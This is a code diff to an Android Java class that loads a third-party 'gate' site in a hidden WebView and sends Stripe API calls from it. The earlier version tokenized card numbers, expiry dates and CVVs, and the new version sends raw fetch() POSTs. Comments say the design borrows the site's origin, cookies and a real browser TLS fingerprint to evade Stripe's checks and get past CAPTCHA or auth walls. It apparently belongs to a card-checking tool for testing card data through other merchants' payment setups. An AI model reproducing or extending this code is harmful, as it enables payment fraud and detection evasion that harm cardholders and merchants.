@@ -9,18 +9,19 @@ import android.webkit.WebSettings;
 import android.webkit.WebView;
 import android.webkit.WebViewClient;
 
+import java.util.Map;
 import java.util.concurrent.CountDownLatch;
 import java.util.concurrent.TimeUnit;
 
 /**
- * Loads the gate's site in a hidden WebView, waits for Stripe.js to be ready,
- * then calls Stripe.createToken() using the site's own Stripe.js instance.
- *
- * Why this works:
- * - WebView = Chromium → correct TLS fingerprint (JA3/JA4)
- * - Site's own domain → correct Origin header for CORS to api.stripe.com
- * - Site's Stripe.js → correct integration surface (no "integration surface" error)
+ * Loads the gate's site in a hidden WebView, then executes raw fetch() calls
+ * to Stripe API from the site's origin. This gives us:
+ * - Chromium TLS fingerprint (JA3/JA4) — Stripe sees real browser
+ * - Correct Origin header — site's domain, which has CORS for api.stripe.com
  * - Real cookies/session from the site
+ *
+ * Unlike the Stripe.js approach, this works even if Stripe.js hasn't loaded
+ * or the page has CAPTCHA/auth wall — we just need the origin.
  */
 public class StripeWebBridge {
 
@@ -29,8 +30,6 @@ public class StripeWebBridge {
     private Activity activity;
     private WebView webView;
     private volatile boolean pageLoaded = false;
-    private CountDownLatch resultLatch;
-    private String lastResult = null;
     private String loadedSiteUrl = null;
 
     @SuppressLint("SetJavaScriptEnabled")
@@ -53,36 +52,36 @@ public class StripeWebBridge {
         WebSettings s = webView.getSettings();
         s.setJavaScriptEnabled(true);
         s.setDomStorageEnabled(true);
-        s.setDatabaseEnabled(true);
         s.setCacheMode(WebSettings.LOAD_DEFAULT);
         s.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
-        s.setAllowFileAccess(true);
 
-        webView.addJavascriptInterface(new BridgeJS(), "StripeBridge");
+        webView.addJavascriptInterface(new BridgeJS(), "SB");
 
         ViewGroup root = (ViewGroup) act.getWindow().getDecorView()
                 .findViewById(android.R.id.content);
         root.addView(webView);
 
-        Log.i(TAG, "WebView created, waiting for siteUrl");
+        Log.i(TAG, "WebView created");
     }
 
     /**
-     * Tokenize a card using the gate site's own Stripe.js.
-     * 1. Loads the site in hidden WebView (if not already loaded)
-     * 2. Polls until window.Stripe is available (up to 15s)
-     * 3. Injects Stripe.createToken('card', {...})
-     * 4. Returns the result JSON
+     * Execute a POST to Stripe API via fetch() from the site's WebView context.
+     * The site's origin handles CORS for api.stripe.com.
+     *
+     * @param siteUrl  The gate's site URL (loaded in WebView for correct origin)
+     * @param apiUrl   The Stripe API endpoint (e.g., https://api.stripe.com/v1/tokens)
+     * @param headers  HTTP headers (Content-Type, Authorization, etc.)
+     * @param body     URL-encoded body
+     * @return         JSON response from Stripe API
      */
-    public String tokenize(String siteUrl, String pk, String number,
-                            String month, String year, String cvv) {
+    public String post(String siteUrl, String apiUrl, Map<String, String> headers, String body) {
         if (activity == null || webView == null) {
             return "{\"error\":{\"message\":\"Bridge not initialized\"}}";
         }
 
         String cleanSite = siteUrl.replaceAll("/+$", "");
 
-        // Step 1: Load site if needed
+        // Step 1: Load the site if not already loaded (gives us correct origin)
         if (!cleanSite.equals(loadedSiteUrl)) {
             Log.i(TAG, "Loading site: " + cleanSite);
             loadedSiteUrl = cleanSite;
@@ -97,11 +96,9 @@ public class StripeWebBridge {
                         pageLoaded = true;
                         loadLatch.countDown();
                     }
-
                     @Override
-                    public void onReceivedError(WebView view, int errorCode,
-                                                String description, String failingUrl) {
-                        Log.e(TAG, "Page error: " + description + " url=" + failingUrl);
+                    public void onReceivedError(WebView view, int code, String desc, String url) {
+                        Log.e(TAG, "Error: " + desc);
                         pageLoaded = true;
                         loadLatch.countDown();
                     }
@@ -110,123 +107,102 @@ public class StripeWebBridge {
             });
 
             try {
-                if (!loadLatch.await(20, TimeUnit.SECONDS)) {
-                    return "{\"error\":{\"message\":\"Site load timeout (20s)\"}}";
+                if (!loadLatch.await(15, TimeUnit.SECONDS)) {
+                    Log.w(TAG, "Site load timeout, trying anyway");
                 }
             } catch (InterruptedException e) {
                 return "{\"error\":{\"message\":\"Interrupted\"}}";
             }
 
-            // Extra wait for JS to initialize
-            try { Thread.sleep(3000); } catch (InterruptedException ignored) {}
+            // Brief wait for JS context to settle
+            try { Thread.sleep(1500); } catch (InterruptedException ignored) {}
         }
 
-        // Step 2: Wait for Stripe.js to be available
-        Log.i(TAG, "Waiting for Stripe.js on " + cleanSite);
-        final CountDownLatch stripeReady = new CountDownLatch(1);
-        String checkJs = "(function(){" +
-            "var tries=0;" +
-            "function check(){" +
-            "  tries++;" +
-            "  if(typeof Stripe!=='undefined'){" +
-            "    StripeBridge.onStripeReady();" +
-            "  } else if(tries<30){" +
-            "    setTimeout(check,500);" +
-            "  } else {" +
-            "    StripeBridge.onStripeReady(); // try anyway" +
-            "  }" +
-            "}" +
-            "check();" +
-            "})()";
-
-        resultLatch = null; // will be set in step 3
-        final CountDownLatch readyLatch = new CountDownLatch(1);
-
-        // Bridge callback for stripe ready
-        readyStripeLatch = readyLatch;
-
-        activity.runOnUiThread(() -> {
-            try {
-                webView.evaluateJavascript(checkJs, null);
-            } catch (Exception e) {
-                Log.e(TAG, "Stripe check failed: " + e.getMessage());
-                readyLatch.countDown();
-            }
-        });
-
-        try {
-            readyLatch.await(20, TimeUnit.SECONDS);
-        } catch (InterruptedException e) {
-            return "{\"error\":{\"message\":\"Interrupted\"}}";
+        // Step 2: Execute fetch() from the site's origin
+        StringBuilder headersJs = new StringBuilder("{");
+        int i = 0;
+        for (Map.Entry<String, String> e : headers.entrySet()) {
+            String k = e.getKey();
+            // Skip Origin/Referer — browser sets from page's real origin
+            if (k.equalsIgnoreCase("Origin") || k.equalsIgnoreCase("Referer")) { i++; continue; }
+            if (i > 0) headersJs.append(",");
+            headersJs.append(jsStr(k)).append(":").append(jsStr(e.getValue()));
+            i++;
         }
+        headersJs.append("}");
 
-        // Step 3: Inject Stripe.createToken
-        Log.i(TAG, "Injecting Stripe.createToken()");
-        resultLatch = new CountDownLatch(1);
-        lastResult = null;
-
-        // Escape for JS string
-        String escNum = number.replace("'", "\\'");
-        String escCvv = cvv.replace("'", "\\'");
+        String jsBody = jsStr(body);
+        String jsUrl = jsStr(apiUrl);
 
         String js = "(function(){" +
             "try{" +
-            "  if(typeof Stripe==='undefined'){" +
-            "    StripeBridge.onResult(JSON.stringify({error:{message:'Stripe.js not loaded'}}));" +
-            "    return;" +
-            "  }" +
-            "  var stripe = Stripe('" + pk + "');" +
-            "  stripe.createToken('card', {" +
-            "    number: '" + escNum + "'," +
-            "    exp_month: " + month + "," +
-            "    exp_year: " + year + "," +
-            "    cvc: '" + escCvv + "'" +
-            "  }).then(function(result) {" +
-            "    StripeBridge.onResult(JSON.stringify(result));" +
-            "  })[" + "catch](function(err) {" +
-            "    StripeBridge.onResult(JSON.stringify({error:{message:err.message||String(err)}}));" +
+            "  fetch(" + jsUrl + ",{" +
+            "    method:'POST'," +
+            "    headers:" + headersJs + "," +
+            "    body:" + jsBody + "," +
+            "    mode:'cors'," +
+            "    credentials:'omit'" +
+            "  }).then(function(r){" +
+            "    return r.text().then(function(t){" +
+            "      SB.onResult(r.status,t);" +
+            "    });" +
+            "  })[" + "catch](function(e){" +
+            "    SB.onError(e.message||String(e));" +
             "  });" +
-            "}catch(e){" +
-            "  StripeBridge.onResult(JSON.stringify({error:{message:e.message||String(e)}}));" +
-            "}" +
+            "}catch(e){SB.onError(e.message||String(e));}" +
             "})()";
+
+        final CountDownLatch latch = new CountDownLatch(1);
+        final String[] result = {null};
+
+        // Store latch in bridge JS interface
+        resultLatch = latch;
+        resultRef = result;
 
         final String fjs = js;
         activity.runOnUiThread(() -> {
             try {
-                webView.evaluateJavascript(fjs, val -> Log.d(TAG, "eval=" + val));
+                webView.evaluateJavascript(fjs, v -> Log.d(TAG, "eval=" + v));
             } catch (Exception e) {
                 Log.e(TAG, "eval failed: " + e.getMessage());
-                lastResult = "{\"error\":{\"message\":\"eval failed: " + e.getMessage() + "\"}}";
-                if (resultLatch != null) resultLatch.countDown();
+                result[0] = "{\"error\":{\"message\":\"eval: " + e.getMessage() + "\"}}";
+                latch.countDown();
             }
         });
 
         try {
-            resultLatch.await(30, TimeUnit.SECONDS);
+            latch.await(30, TimeUnit.SECONDS);
         } catch (InterruptedException e) {
-            Log.e(TAG, "Interrupted");
+            return "{\"error\":{\"message\":\"Interrupted\"}}";
         }
 
-        if (lastResult != null) return lastResult;
-        return "{\"error\":{\"message\":\"No response from Stripe bridge\"}}";
+        if (result[0] != null) return result[0];
+        return "{\"error\":{\"message\":\"No response from bridge\"}}";
     }
 
-    // Callback from JS: Stripe.js is ready
-    private CountDownLatch readyStripeLatch;
+    // Bridge state for fetch callback
+    private CountDownLatch resultLatch;
+    private String[] resultRef;
+
+    private static String jsStr(String s) {
+        if (s == null) return "''";
+        return "'" + s.replace("\\", "\\\\").replace("'", "\\'")
+                      .replace("\n", "\\n").replace("\r", "\\r")
+                      .replace("/", "\\/") + "'";
+    }
 
     private class BridgeJS {
         @JavascriptInterface
-        public void onStripeReady() {
-            Log.i(TAG, "Stripe.js is available on page");
-            if (readyStripeLatch != null) readyStripeLatch.countDown();
+        public void onResult(int status, String body) {
+            Log.i(TAG, "Response: status=" + status + " len=" + (body != null ? body.length() : 0));
+            if (resultRef != null) resultRef[0] = body;
+            if (resultLatch != null) resultLatch.countDown();
         }
 
         @JavascriptInterface
-        public void onResult(String result) {
-            int len = result != null ? Math.min(result.length(), 300) : 0;
-            Log.i(TAG, "Result (" + len + " chars): " + (result != null ? result.substring(0, len) : "null"));
-            lastResult = result;
+        public void onError(String msg) {
+            Log.e(TAG, "Fetch error: " + msg);
+            if (resultRef != null) resultRef[0] = "{\"error\":{\"message\":\"" + msg.replace("\"", "'") + "\"}}";
             if (resultLatch != null) resultLatch.countDown();
         }
     }
